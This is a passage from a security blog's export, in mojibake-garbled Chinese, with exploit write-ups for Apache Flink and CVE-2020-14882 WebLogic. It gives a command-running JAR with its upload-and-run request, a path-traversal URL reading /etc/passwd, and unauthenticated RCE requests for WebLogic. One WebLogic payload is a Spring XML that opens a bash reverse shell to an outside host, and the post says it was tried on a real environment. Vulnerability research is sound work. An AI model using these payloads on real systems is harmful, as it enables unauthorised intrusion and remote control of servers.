class="string">&quot;key&quot;</span>:<span class="string">&quot;jobmanager.memory.process.size&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;1600m&quot;</span>&#125;,&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;web.tmpdir&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;/tmp/flink-web-5a1a5e27-aa74-4900-9f1c-ad5af08f3d37&quot;</span>&#125;,&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;jobmanager.rpc.port&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;6123&quot;</span>&#125;,&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;query.server.port&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;6125&quot;</span>&#125;]</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;tmp&#x2F;flink-web-5a1a5e27-aa74-4900-9f1c-ad5af08f3d37</span><br></pre></td></tr></table></figure>

<h4 id="ä¸Šä¼ JARæ–‡ä»¶"><a href="#ä¸Šä¼ JARæ–‡ä»¶" class="headerlink" title="ä¸Šä¼ JARæ–‡ä»¶"></a>ä¸Šä¼ JARæ–‡ä»¶</h4><p>æ‰“åŒ…å¦‚ä¸‹ä»£ç </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> Ï€ ~/Desktop â¯ javac Test.java</span><br><span class="line"> Ï€ ~/Desktop â¯ <span class="built_in">cd</span> dddd</span><br><span class="line"> Ï€ ~/Desktop/dddd â¯ jar -cvf dddd.jar Test.class</span><br><span class="line">å·²æ·»åŠ æ¸…å•</span><br><span class="line">æ­£åœ¨æ·»åŠ : Test.class(è¾“å…¥ = 1250) (è¾“å‡º = 758)(å‹ç¼©äº† 39%)</span><br><span class="line"> Ï€ ~/Desktop/dddd â¯</span><br><span class="line"> </span><br><span class="line"><span class="comment"># --------------------åˆ†éš”ç¬¦-----------------------</span></span><br><span class="line"></span><br><span class="line">import java.io.File;</span><br><span class="line">import java.util.Scanner;</span><br><span class="line"></span><br><span class="line">public class Test &#123;</span><br><span class="line">    public <span class="function"><span class="title">Test</span></span>() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        String o = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        String cmd = args[0];</span><br><span class="line">        ProcessBuilder p;</span><br><span class="line">        <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">            p = new ProcessBuilder(new String[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String pty = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> ((new File(<span class="string">&quot;/bin/bash&quot;</span>)).exists()) &#123;</span><br><span class="line">                pty = <span class="string">&quot;/bin/bash&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            p = new ProcessBuilder(new String[]&#123;pty, <span class="string">&quot;-c&quot;</span>, cmd&#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Process s = p.start();</span><br><span class="line">        Scanner c = (new Scanner(s.getInputStream())).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ EXP(dddd.jar)æ–‡ä»¶åˆ°<code>/tmp/flink-web-5a1a5e27-aa74-4900-9f1c-ad5af08f3d37/flink-web-upload</code>ç›®å½•ä¸‹ï¼Œ</p>
<p><img src="/posts/87dcd60b/image-20210108165729454.png" alt="image-20210108165729454"></p>
<h4 id="æ‰§è¡Œå‘½ä»¤"><a href="#æ‰§è¡Œå‘½ä»¤" class="headerlink" title="æ‰§è¡Œå‘½ä»¤"></a>æ‰§è¡Œå‘½ä»¤</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /jars/dddd.jar/run?entry-class=Test&amp;program-args=%22ping%20-c%204%20ibrzca.dnslog.cn%22 HTTP/1.1</span><br><span class="line">Host: localhost:8081</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://localhost:8081/</span><br><span class="line">Cookie: Idea-ebfc5b99=abcb5f88-d377-4462-9749-1fb24350d578</span><br></pre></td></tr></table></figure>

<p><img src="/posts/87dcd60b/image-20210108171419590.png" alt="image-20210108171419590"></p>
<p><a href="Apache-Flink-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5-%E8%AF%BB%E5%8F%96/dddd.jar">dddd.jar</a></p>
<h1 id="CVE-2020-17519-Apache-Flinkä»»æ„æ–‡ä»¶è¯»å–"><a href="#CVE-2020-17519-Apache-Flinkä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="CVE-2020-17519(Apache Flinkä»»æ„æ–‡ä»¶è¯»å–)"></a>CVE-2020-17519(Apache Flinkä»»æ„æ–‡ä»¶è¯»å–)</h1><h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081//jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd</span><br></pre></td></tr></table></figure>



<p><img src="/posts/87dcd60b/image-20210111093558712.png" alt="image-20210111093558712"></p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ©ç”¨</category>
      </categories>
      <tags>
        <tag>Apache Flink</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2020-14882 WeblogicæœªæˆæƒRCE</title>
    <url>/posts/9d76ce8e/</url>
    <content><![CDATA[<p>CVE-2020-14882 weblogic æœªæˆæƒå‘½ä»¤æ‰§è¡Œå¤ç°åŠè¡¥ä¸ç»•è¿‡ </p>
<a id="more"></a>

<h1 id="CVE-2020-14882-weblogic-æœªæˆæƒRCEå¤ç°"><a href="#CVE-2020-14882-weblogic-æœªæˆæƒRCEå¤ç°" class="headerlink" title="CVE-2020-14882 weblogic æœªæˆæƒRCEå¤ç°"></a>CVE-2020-14882 weblogic æœªæˆæƒRCEå¤ç°</h1><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>æœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹æ”»å‡»è€…å¯èƒ½é€šè¿‡æ„é€ ç‰¹æ®Šçš„ HTTP GETè¯·æ±‚ï¼Œåˆ©ç”¨è¯¥æ¼æ´åœ¨å—å½±å“çš„ WebLogic Server ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚</p>
<p>æ ¹æ®è¡¥ä¸diffç»“æœæˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œå¯ä»¥çœ‹å‡ºä¸Šé¢çš„å˜åŒ–</p>
<p><img src="/posts/9d76ce8e/img20201028190943.png" alt="img"></p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹é¢çš„ä»£ç ï¼Œä»»æ„åŠ è½½æŸä¸ªç±»æˆ–è€…å¯¹è±¡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;&lt;target&gt;&#x2F;console&#x2F;console.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;HomePage1&amp;handle&#x3D;java.lang.String(&quot;ahihi&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="/posts/9d76ce8e/img20201028191206.png" alt="img"></p>
<h2 id="æœªæˆæƒè®¿é—®"><a href="#æœªæˆæƒè®¿é—®" class="headerlink" title="æœªæˆæƒè®¿é—®"></a>æœªæˆæƒè®¿é—®</h2><p>éæ³•å­—ç¬¦ç»•è¿‡ç™»é™†ä¿æŠ¤</p>
<p><img src="/posts/9d76ce8e/img20201028191328.png" alt="img"></p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>é¦–å…ˆé€šè¿‡éæ³•å­—ç¬¦ç»•è¿‡è®¿é—®ï¼Œç„¶åé€šè¿‡Gadgetè°ƒç”¨å‘½ä»¤æ‰§è¡Œï¼Œpocå¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;console&#x2F;images&#x2F;%252E%252E%252Fconsole.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;HomePage1&amp;handle&#x3D;com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27calc.exe%27);%22); HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.3.189:7001</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko&#x2F;20100101 Firefox&#x2F;81.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: ADM</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>

<p><img src="/posts/9d76ce8e/img20201028191447.png" alt="img"></p>
<h1 id="cve-2020-14882-weblogic-è¡¥ä¸ç»•è¿‡ç™»å½•åˆ†æ"><a href="#cve-2020-14882-weblogic-è¡¥ä¸ç»•è¿‡ç™»å½•åˆ†æ" class="headerlink" title="cve-2020-14882 weblogic è¡¥ä¸ç»•è¿‡ç™»å½•åˆ†æ"></a>cve-2020-14882 weblogic è¡¥ä¸ç»•è¿‡ç™»å½•åˆ†æ</h1><p>åœ¨è¿™é‡Œæˆ‘çš„weblogicç‰ˆæœ¬ä¸º12.2.1.4ï¼Œå…¶ä»–ç‰ˆæœ¬éƒ½å¤§åŒå°å¼‚ã€‚ä¸‹é¢æˆ‘ä»¬çœ‹ä¸€ä¸‹è¡¥ä¸diffç»“æœ</p>
<p><img src="/posts/9d76ce8e/img20201029135449.png" alt="img"></p>
<p>å› ä¸ºè¿™ä¸ªç±»æ˜¯weblogicä»httpè®¿é—®çš„å¤„ç†ç±»ï¼Œç›´æ¥ç¦æ­¢urlæ˜¯å¦åŒ…å«å±é™©å­—ç¬¦ï¼Œå¦‚æœåŒ…å«ï¼Œåˆ™ç›´æ¥é€€å‡ºã€‚ä¿®å¤æ–¹æ¡ˆç®€å•ç²—æš´ï¼Œä¸å¾—ä¸ä½©æœã€‚å±é™©å­—ç¬¦ä¸»è¦æœ‰ä»¥ä¸‹å‡ ä¸ª</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private static final String[] IllegalUrl &#x3D; new String[]&#123;&quot;;&quot;, &quot;%252E%252E&quot;, &quot;%2E%2E&quot;, </span><br><span class="line">&quot;..&quot;, &quot;%3C&quot;, &quot;%3E&quot;, &quot;&lt;&quot;, &quot;&gt;&quot;&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="weblogic-ç®¡ç†æ§åˆ¶å°æƒé™æ§åˆ¶åˆ†æ"><a href="#weblogic-ç®¡ç†æ§åˆ¶å°æƒé™æ§åˆ¶åˆ†æ" class="headerlink" title="weblogic ç®¡ç†æ§åˆ¶å°æƒé™æ§åˆ¶åˆ†æ"></a>weblogic ç®¡ç†æ§åˆ¶å°æƒé™æ§åˆ¶åˆ†æ</h2><p>è¦åˆ†æè¿™ä¸ªæ´ï¼Œé¦–å…ˆæˆ‘ä»¬éœ€è¦äº†è§£ä¸€ä¸‹ï¼Œç™»å½•weblogicç®¡ç†æ§åˆ¶å°çš„æƒé™æ§åˆ¶</p>
<p>åœ¨å¤„ç†urlçš„<code>weblogic.servlet.internal.WebAppServletContext#doSecuredExecuteæ–¹æ³•</code>ä¸­ï¼Œè°ƒç”¨å¦‚ä¸‹çš„ä»£ç å»åˆ¤æ–­æƒé™ç­‰ä¸€åˆ‡æœ‰å…³äºå®‰å…¨çš„å†…å®¹ã€‚ä»£ç å¦‚ä¸‹</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (context.getSecurityManager().checkAccess(req, rsp, applyAuthFilters, <span class="keyword">false</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> count = ((SessionSecurityData)s).getConcurrentRequestCount();</span><br><span class="line">        <span class="keyword">if</span> (maxConcurrentRequestsAllowed != -<span class="number">1</span> &amp;&amp; count &gt; maxConcurrentRequestsAllowed) &#123;</span><br><span class="line">            context.logError(<span class="string">&quot;Rejecting request since concurrent requests allowable limit exceeded :&quot;</span> + maxConcurrentRequestsAllowed);</span><br><span class="line">            rsp.sendError(<span class="number">500</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨<code>weblogic.servlet.security.internal.WebAppSecurity#checkAccess(HttpServletRequest, HttpServletResponse, boolean, boolean, boolean)</code>ä¸­ï¼Œåˆ¤æ–­æ˜¯å¦æ‰€æœ‰urléƒ½éœ€è¦æƒé™ã€‚å½“ç„¶ï¼Œè®¿é—®é™æ€èµ„æºè‚¯å®šæ˜¯ä¸éœ€è¦ç™»é™†çš„ï¼Œå¯èƒ½æ˜¯ä¸ºäº†æµè§ˆå™¨å…¼å®¹æ€§è€ƒè™‘ï¼Œå› ä¸ºå¤§éƒ¨åˆ†æµè§ˆå™¨åœ¨ç™»é™†åï¼Œå¯¹è®¿é—®é™æ€èµ„æºéƒ½ä¼šæ·»åŠ cookieå¤´ï¼Œåªæœ‰ä¸ªåˆ«æµè§ˆå™¨ä¸ä¼šã€‚</p>
<p>æ‰€ä»¥weblogicå°†ä¼šæ ¹æ®è®¿é—®çš„urlï¼Œä¹Ÿå°±æ˜¯æ˜¯å¦ä¸ºé™æ€èµ„æºï¼Œå»è¿”å›ä¸€ä¸ª<code>ResourceConstraint</code>å¯¹è±¡ã€‚è¯¥å¯¹è±¡æè¿°äº†è¯¥urlè®¿é—®çš„èµ„æºçš„è¯¦ç»†æƒé™ä¿¡æ¯</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">            ResourceConstraint resourceConstraint = checkAllResources ? Holder.ALL_CONSTRAINT : <span class="keyword">this</span>.getConstraint(request);</span><br><span class="line"></span><br><span class="line">authorized = <span class="keyword">this</span>.delegateModule.isAuthorized(request, response, resourceConstraint, </span><br><span class="line">applyAuthFilters)</span><br></pre></td></tr></table></figure>

<p>ç„¶åè°ƒç”¨<code>weblogic.servlet.security.internal.SecurityModule#isAuthorized</code>æ–¹æ³•ï¼Œåœ¨è¯¥æ–¹æ³•ä¸­è·å–ç”¨æˆ·sessionï¼Œè°ƒç”¨<code>weblogic.servlet.security.internal.ChainedSecurityModule#checkAccess</code>æ–¹æ³•åšè¿›ä¸€æ­¥æƒé™æ ¡éªŒã€‚</p>
<p>æœ€åä¼šåœ¨weblogic.servlet.security.internal.CertSecurityModule#checkUserPermä¸­è°ƒç”¨weblogic.servlet.security.internal.WebAppSecurity#hasPermissionæ–¹æ³•ï¼Œæ ¹æ®æœ€å¼€å§‹ç”Ÿæˆçš„<code>ResourceConstraint</code>å¯¹è±¡ï¼Œåˆ¤æ–­è¯¥æ¬¡httpè¯·æ±‚æ˜¯å¦æœ‰æƒé™ã€‚å¦‚å›¾æ‰€ç¤º</p>
<p><img src="/posts/9d76ce8e/img20201029141105.png" alt="img"></p>
<p>å¦‚æœç”¨æˆ·è®¿é—®çš„æ˜¯é™æ€èµ„æºï¼Œåˆ™è¿”å›unrestrictedçš„å€¼ï¼ŒhasPermissionè¿”å›ä¸ºtrueï¼Œweblogicè®¤ä¸ºä½ æœ‰æƒé™è®¿é—®ï¼Œäºæ˜¯å°±ä¼šæ”¾è¡Œã€‚å¦‚æœä½ è®¿é—®éé™æ€æƒé™ï¼Œåˆ™ç›´æ¥æ‹¦æˆªä½ çš„è¯·æ±‚ï¼Œé‡å®šå‘è‡³ç™»é™†é¡µã€‚</p>
<p>äºæ˜¯ç»•è¿‡ç™»å½•çš„å…³é”®åœ¨äºï¼Œæ€ä¹ˆè®¿é—®æ­£å¸¸çš„èµ„æºï¼Œä½†æ˜¯weblogicè¿”å›çš„æ˜¯é™æ€èµ„æºçš„<code>ResourceConstraint</code>å¯¹è±¡</p>
<h2 id="æƒé™ç»•è¿‡åˆ†æ"><a href="#æƒé™ç»•è¿‡åˆ†æ" class="headerlink" title="æƒé™ç»•è¿‡åˆ†æ"></a>æƒé™ç»•è¿‡åˆ†æ</h2><p>æˆ‘ä»¬å›åˆ°æœ€å¼€å§‹çš„</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ResourceConstraint resourceConstraint &#x3D; checkAllResources ? Holder.ALL_CONSTRAINT : this.getConstraint(request)</span><br></pre></td></tr></table></figure>

<p>è·Ÿå…¥<code>weblogic.servlet.security.internal.WebAppSecurityWLS#getConstraint(java.lang.String, java.lang.String)</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ResourceConstraint rcForAllMethods = consForAllMethods == <span class="keyword">null</span> ? <span class="keyword">null</span> : </span><br><span class="line">(ResourceConstraint)consForAllMethods.get(relURI);</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™é‡Œä¼šè°ƒç”¨<code>weblogic.servlet.utils.StandardURLMapping#get</code>å»æ ¹æ®urlï¼Œè¿”å›å¯¹åº”çš„<code>ResourceConstraint</code>å¯¹è±¡ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(String path)</span> </span>&#123;</span><br><span class="line">    path = path.length() == <span class="number">0</span> ? <span class="string">&quot;/&quot;</span> : <span class="keyword">this</span>.cased(path);</span><br><span class="line">    Object value = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> ((value = <span class="keyword">this</span>.getExactOrPathMatch(path)) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (value = <span class="keyword">this</span>.getExtensionMatch(path)) != <span class="keyword">null</span> ? value : <span class="keyword">this</span>.getDefault();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆè°ƒç”¨<code>getExactOrPathMatch</code>æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯æ ¹æ®urlï¼ŒåŒ¹é…æ˜¯å¦åœ¨é™æ€èµ„æºåˆ—è¡¨ä¸­ï¼Œ</p>
<p><img src="/posts/9d76ce8e/img20201029142145.png" alt="img"></p>
<p>è€Œ <code>%252E%252E%252F</code> æ°å¥½æ˜¯../çš„urläºŒæ¬¡ç¼–ç ç»“æœã€‚è¿™æ ·æ—¢å¯ä»¥è¿”å›é™æ€èµ„æºçš„<code>ResourceConstraint</code>å¯¹è±¡ï¼Œåˆä¸ä¼šå½±å“æ­£å¸¸è®¿é—®ã€‚</p>
<h2 id="weblogic-äºŒæ¬¡ç¼–ç åŸå› "><a href="#weblogic-äºŒæ¬¡ç¼–ç åŸå› " class="headerlink" title="weblogic äºŒæ¬¡ç¼–ç åŸå› "></a>weblogic äºŒæ¬¡ç¼–ç åŸå› </h2><p>åœ¨pocä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ<code>../</code>è¢«äºŒæ¬¡ç¼–ç äº†ã€‚ä¸‹é¢æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹weblogicèƒ½è§£å¼€çš„åŸå› </p>
<p>æ ¹æ®httpè§„å®šï¼Œurléƒ¨åˆ†ï¼Œéœ€è¦urlç¼–ç åå‘é€ç»™æœåŠ¡å™¨ã€‚æœåŠ¡å™¨æ­£å¸¸è§£å¼€å¹¶ç»§ç»­å¤„ç†ã€‚è¿™æ˜¯ç¬¬ä¸€å±‚urlç¼–ç </p>
<p>ç¬¬äºŒå±‚ç¼–ç çš„å¤„ç†ï¼Œåœ¨<code>com.bea.netuix.servlets.manager.UIServletInternal#getTree</code>ä¸­ï¼Œ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> UIControl <span class="title">getTree</span><span class="params">(String requestPattern, UIContext ctxt, <span class="keyword">boolean</span> setContentType, ResolvedLocale resolvedLocale)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">    HttpServletRequest request = ctxt.getServletRequest();</span><br><span class="line">    HttpServletResponse response = ctxt.getServletResponse();</span><br><span class="line">    requestPattern = URLDecoder.decode(requestPattern, containerServices.getWebappServices().getServerDefaultEncoding());</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­<code>URLDecoder.decode</code>ä¼šå¯¹ç¬¬ä¸€æ¬¡ç¼–ç åçš„urlåšç¬¬äºŒæ¬¡è§£ç çš„å·¥ä½œï¼Œå½“ç„¶ï¼Œå¦‚æœurlè¿˜å­˜åœ¨urlç¼–ç çš„è¯ã€‚</p>
<p>è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆä¸¤æ¬¡ç¼–ç å¯ä»¥ç»•è¿‡çš„åŸå› ã€‚</p>
<p>ä¸€æ¬¡urlç¼–ç ä¸ºä»€ä¹ˆä¸å¯ä»¥ç»•è¿‡ï¼Ÿå› ä¸ºç»è¿‡æœåŠ¡å™¨ä¸€æ¬¡è§£ç åï¼Œåœ¨<code>weblogic.servlet.utils.StandardURLMapping#get</code>å¤„ï¼Œæ— æ³•åŒ¹é…åˆ°é™æ€èµ„æºã€‚ä¼šè¢«è¿˜åŸæˆåŸæœ¬çš„urlï¼Œæ‰€ä»¥æ— æ³•ç»•è¿‡ã€‚ã€‚å¤§å®¶æœ‰æœºä¼šå¯ä»¥çœ‹ä¸€ä¸‹<code>weblogic.utils.collections.MatchMap#match</code>å…³äºæŸ¥æ‰¾çš„ä»£ç </p>
<h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><h3 id="weblogic-12"><a href="#weblogic-12" class="headerlink" title="weblogic 12"></a>weblogic 12</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:7001&#x2F;console&#x2F;css&#x2F;%2e%2e%2fconsole.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;HomePage1&amp;handle&#x3D;com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27calc.exe%27);%22);</span><br></pre></td></tr></table></figure>

<p>å› ä¸º<code>com.tangosol.coherence.mvel2.sh.ShellSession</code>è¿™ä¸ªgadgetï¼Œåªå­˜åœ¨äºweblogic 12ï¼Œweblogic10 å¹¶æ²¡æœ‰è¿™ä¸ªgadgetï¼ˆæ²¡æœ‰åŒ…ï¼‰ï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨</p>
<h3 id="weblogic-10"><a href="#weblogic-10" class="headerlink" title="weblogic 10"></a>weblogic 10</h3><p>å› ä¸ºweblogic 10æ²¡æœ‰ç›¸å…³gadgetæ‰€ä»¥ä¼šæŠ¥é”™</p>
<p>éœ€è¦ä½¿ç”¨<code> com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code></p>
<p>pocå¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:7001&#x2F;console&#x2F;css&#x2F;%2e%2e%2fconsole.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;HomePage1&amp;handle&#x3D;com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http:&#x2F;&#x2F;192.168.184.1:8000&#x2F;spel.xml&quot;)</span><br></pre></td></tr></table></figure>

<h3 id="2021-1-28çœŸå®ç¯å¢ƒæµ‹è¯•"><a href="#2021-1-28çœŸå®ç¯å¢ƒæµ‹è¯•" class="headerlink" title="2021-1-28çœŸå®ç¯å¢ƒæµ‹è¯•"></a>2021-1-28çœŸå®ç¯å¢ƒæµ‹è¯•</h3><p>Pom.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">                           http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">value</span>&gt;</span> <span class="comment">&lt;!--winç”¨cmd--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">value</span>&gt;</span> <span class="comment">&lt;!--winç”¨ /c --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>&lt;![CDATA[bash -i &gt;&amp; /dev/tcp/10.10.12.189/4444 0&gt;&amp;1]]&gt;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>BURPæ•°æ®åŒ…</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">GET /console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://10.10.12.189:8000/pom.xml&quot;) HTTP/1.1</span><br><span class="line">Accept: image/gif, image/jpeg, image/pjpeg, application/x-ms-application, application/xaml+xml, application/x-ms-xbap, */*</span><br><span class="line">Accept-Language: en-US,en;q=<span class="number">0.8</span>,zh-Hans-CN;q=<span class="number">0.5</span>,zh-Hans;q=<span class="number">0.2</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">4.0</span> (compatible; MSIE <span class="number">7.0</span>; Windows NT <span class="number">10.0</span>; WOW64; Trident/<span class="number">7.0</span>; .NET4<span class="number">.0</span>C; .NET4<span class="number">.0</span>E; Tablet PC <span class="number">2.0</span>; .NET CLR <span class="number">2.0</span><span class="number">.50727</span>; .NET CLR <span class="number">3.0</span><span class="number">.30729</span>; .NET CLR <span class="number">3.5</span><span class="number">.30729</span>)</span><br><span class="line">Host: x x x</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: UM_distinctid=<span class="number">17742</span>b293af3b5<span class="number">-0</span>f356b47557976<span class="number">-43494</span>a0a<span class="number">-187548</span><span class="number">-17742</span>b293b14ec; JSESSIONID=B-FC225Ixflyyd9AQbDdqx8YqLnNO6QjinDdQSY6ECP--DFMJab3!<span class="number">-496998100</span>; ADMINCONSOLESESSION=SUFHvSOu6N4F9qSjaR0xIFbCkT4acNJbKBGi31-yX2M4Z5ofW60I!<span class="number">-496998100</span></span><br></pre></td></tr></table></figure>



<p><img src="/posts/9d76ce8e/image-20210128163416212.png" alt="image-20210128163416212"></p>
<p>åŸæ–‡åœ°å€ï¼š</p>
<blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vcG90YXRzb1NlYy9wLzEzODk1MTIwLmh0bWw=">https://www.cnblogs.com/potatsoSec/p/13895120.html<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vcG90YXRzb1NlYy9wLzEzODk2NzcxLmh0bWw=">https://www.cnblogs.com/potatsoSec/p/13896771.html<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
]]></content>
      <categories>
        <category>æ¼æ´å¤ç°</category>
      </categories>
      <tags>
        <tag>å‘½ä»¤æ‰§è¡Œ</tag>
      </tags>
  </entry>
  <entry>
    <title>æ”¹é€ èšå‰‘</title>
    <url>/posts/b371c6dd/</url>
